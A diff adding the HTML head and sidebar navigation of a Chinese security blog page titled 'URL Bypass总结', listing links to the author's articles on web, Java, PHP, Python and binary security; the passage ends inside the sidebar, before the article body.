@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    
+      <link rel="icon" href="/kanxi.jpg">
+    
+
+    <title>
+        
+          URL Bypass总结 - Mi1k7ea
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/css/spectre.min.css">
+    <link rel="stylesheet" href="/css/spectre-exp.min.css">
+    <link rel="stylesheet" href="/css/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">Mi1k7ea</a>
+  </h4>
+  <div class="sidebar-content">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong>    |    <strong><a href="/secwebsite/">站点收录</a></strong>    |    <strong><a href="/atom.xml">RSS</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/04/06/浅析postMessage安全/">postMessage跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2020/03/11/浅析HRS漏洞/">浅析HRS漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2020/04/06/从浏览器解析原理看XSS/">从浏览器解析原理看XSS</a></li>
+<li><a href="/2020/04/07/跨域通信中的XSS利用/">跨域通信中的XSS利用</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716609" target="_blank" rel="noopener">(旧博客)Web安全加固小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78686832" target="_blank" rel="noopener">(旧博客)DoS与DDoS小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301189" target="_blank" rel="noopener">(旧博客)MySQL数据库提权小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/69952026" target="_blank" rel="noopener">(旧博客)OWASP_top_10漏洞的总结笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76944203" target="_blank" rel="noopener">(旧博客)使用Docker搭建Nginx整数溢出漏洞（CVE-2017-7529）及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76862120" target="_blank" rel="noopener">(旧博客)使用Docker搭建Struts2-048漏洞环境及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76714002" target="_blank" rel="noopener">(旧博客)webshell的NTFS交换数据流文件隐藏及Python脚本查杀</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/59085529" target="_blank" rel="noopener">(旧博客)关于phpMyAdmin默认安装漏洞的学习笔记</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78457976" target="_blank" rel="noopener">(旧博客)机器学习应用之WebShell检测</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78298719" target="_blank" rel="noopener">(旧博客)数据挖掘之k-means算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78012697" target="_blank" rel="noopener">(旧博客)数据挖掘之决策树归纳算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003975" target="_blank" rel="noopener">(旧博客)数据挖掘之Apriori算法的Python实现</a></li>
+</ul>
+</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80306977" target="_blank" rel="noopener">(旧博客)通过Pentester_Lab学习XML注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70168346" target="_blank" rel="noopener">(旧博客)Sqli-labs之Less1-10</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60882602" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件包含漏洞（File Inclusion）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">(旧博客)通过DVWA学习CSRF漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">(旧博客)通过DVWA学习存储型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60359729" target="_blank" rel="noopener">(旧博客)通过DVWA学习反射型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56307364" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL盲注</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL注入漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54669614" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件上传漏洞（File Upload）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54630440" target="_blank" rel="noopener">(旧博客)通过DVWA学习命令执行漏洞（Command Execution）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/16/OGNL表达式注入漏洞总结/">OGNL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/24/浅析Groovy代码注入漏洞/">浅析Groovy代码注入漏洞</a></li>
+<li><a href="/2020/04/12/浅析Easy-Rules代码注入漏洞/">浅析Easy-Rules代码注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析QLExpress表达式注入漏洞/">浅析QLExpress表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析BeanShell代码注入漏洞/">浅析BeanShell代码注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析JUEL表达式注入漏洞/">浅析JUEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析JSEL表达式注入漏洞/">浅析JSEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析MvEL表达式注入漏洞/">浅析MvEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析FEL表达式注入漏洞/">浅析FEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析JEXL表达式注入漏洞/">浅析JEXL表达式注入漏洞</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2020/04/01/Tomcat-URL解析差异性及利用/">Tomcat URL解析差异性及利用</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+<li><a href="/2020/04/06/PHP代码审计敏感配置与版本特性/">PHP代码审计敏感配置与版本特性</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70228700" target="_blank" rel="noopener">(旧博客)PHP代码审计之基础篇</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78358332" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之MetInfo CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78304692" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之XDcms</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+<li><a href="/2020/04/08/Python安全小工具之MySQL监控代理/">Python安全小工具之MySQL监控代理</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78705998" target="_blank" rel="noopener">(旧博客)Python安全小工具之日志分析识别AWVS扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78445866" target="_blank" rel="noopener">(旧博客)Python安全小工具之Linux日志痕迹清除</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78443601" target="_blank" rel="noopener">(旧博客)Python安全小工具之Web目录扫描器</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003891" target="_blank" rel="noopener">(旧博客)Python安全小工具之计算文件Hash值</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003609" target="_blank" rel="noopener">(旧博客)Python安全小工具之生成高精度字典</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72972238" target="_blank" rel="noopener">(旧博客)关于《Python绝技：运用Python成为顶级黑客》的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/71152826" target="_blank" rel="noopener">(旧博客)关于《Python黑帽子：黑客与渗透测试编程之道》的学习笔记</a></li>
+</ul>
+</li>
+<li>爬虫<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/68961258" target="_blank" rel="noopener">(旧博客)Python爬虫之基础篇</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78411824" target="_blank" rel="noopener">(旧博客)Python爬虫之爬取动态页面数据</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78840444" target="_blank" rel="noopener">(旧博客)Python爬虫之Scrapy爬虫框架</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78850550" target="_blank" rel="noopener">(旧博客)Python爬虫之分布式爬虫</a></li>
+</ul>
+</li>
+<li>Django<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78505235" target="_blank" rel="noopener">(旧博客)基于Django搭建简单的博客系统</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>Node.js<ul>
+<li><a href="/2020/03/29/浅析Node-js安全/">浅析Node.js安全</a></li>
+<li><a href="/2020/03/29/node-serialize反序列化漏洞/">node-serialize反序列化漏洞</a></li>
+</ul>
+</li>
+<li>AngularJS<ul>
+<li><a href="/2020/03/29/浅析AngularJS安全/">浅析AngularJS安全</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+<li><a href="/2020/04/08/C编写实现AWD进程木马/">C编写实现AWD进程木马</a></li>
+</ul>
+</li>
+<li>逆向工程<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80334012" target="_blank" rel="noopener">(旧博客)逆向分析HelloWorld程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80380974" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme#1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80546988" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme #2</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80549743" target="_blank" rel="noopener">(旧博客)函数调用约定</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80554677" target="_blank" rel="noopener">(旧博客)栈帧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80558193" target="_blank" rel="noopener">(旧博客)逆向分析Tut.ReverseMe1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80571933" target="_blank" rel="noopener">(旧博客)PE文件格式</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80611969" target="_blank" rel="noopener">(旧博客)运行时压缩（UPX）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636568" target="_blank" rel="noopener">(旧博客)基址重定位表</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636900" target="_blank" rel="noopener">(旧博客)从可执行文件中删除.reloc节区</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80656921" target="_blank" rel="noopener">(旧博客)UPack的PE文件头分析与OEP查找</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80670045" target="_blank" rel="noopener">(旧博客)内嵌补丁练习</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80684358" target="_blank" rel="noopener">(旧博客)Windows消息钩取</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80777748" target="_blank" rel="noopener">(旧博客)DLL注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80780830" target="_blank" rel="noopener">(旧博客)DLL卸载</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80789234" target="_blank" rel="noopener">(旧博客)通过修改PE加载DLL</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82947635" target="_blank" rel="noopener">(旧博客)代码注入（线程注入）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82954890" target="_blank" rel="noopener">(旧博客)使用汇编语言编写注入代码</a></li>
+</ul>
+</li>
+<li>Fuzzing<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80950537" target="_blank" rel="noopener">(旧博客)Windows缓冲区溢出之SLMail</a></li>
+</ul>
+</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681200" target="_blank" rel="noopener">(旧博客)被动信息收集之DNS信息收集</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681596" target="_blank" rel="noopener">(旧博客)被动信息收集之RECON-NG</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63682444" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63684778" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/64906997" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/66473045" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301318" target="_blank" rel="noopener">(旧博客)渗透测试之漏洞扫描阶段</a></li>
